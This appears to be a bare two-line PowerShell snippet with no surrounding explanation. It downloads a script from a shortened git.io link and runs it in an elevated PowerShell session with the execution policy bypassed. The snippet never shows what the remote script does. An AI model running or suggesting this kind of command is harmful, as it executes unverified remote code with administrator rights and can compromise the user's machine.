$script = [Scriptblock]::Create((New-Object System.Net.WebClient).DownloadString('https://git.io/JOPU5'))
Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -NoExit -Command $script" -Verb RunAs
